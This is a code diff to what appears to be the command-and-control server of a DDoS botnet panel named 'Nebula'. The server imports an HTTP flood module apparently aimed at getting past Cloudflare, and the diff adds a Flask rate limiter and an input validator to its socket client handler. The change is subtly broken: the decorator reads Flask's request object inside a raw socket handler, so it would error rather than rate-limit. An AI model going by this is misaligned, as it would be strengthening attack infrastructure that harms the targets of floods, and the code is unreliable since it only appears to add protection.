@@ -20,6 +20,33 @@ from src.Commands.http_cfb import http_cfb
 # Imports
 import socket, threading, time, ipaddress, random, json
 from colorama import Fore, init
+from functools import wraps
+from flask import request, jsonify, Flask
+import re
+
+app = Flask(__name__)
+
+def rate_limit(limit, per):
+    def decorator(f):
+        calls = {}
+
+        @wraps(f)
+        def wrapped(*args, **kwargs):
+            now = time.time()
+            if request.remote_addr not in calls:
+                calls[request.remote_addr] = []
+            calls[request.remote_addr] = [t for t in calls[request.remote_addr] if t > now - per]
+            if len(calls[request.remote_addr]) >= limit:
+                return jsonify({"error": "rate limit exceeded"}), 429
+            calls[request.remote_addr].append(now)
+            return f(*args, **kwargs)
+        return wrapped
+    return decorator
+
+def validate_input(input, pattern):
+    if not re.match(pattern, input):
+        raise ValueError("Invalid input")
+    return input
 
 def color(data_input_output):
     random_output = data_input_output
@@ -211,6 +238,7 @@ def captcha(send, client, grey):
         client.close()
 
 # Client handler
+@rate_limit(5, 60)
 def handle_client(client, address):
     send(client, f'\x1bNebula | Login: Awaiting Response...\a', False)
     send(client, ansi_clear, False)
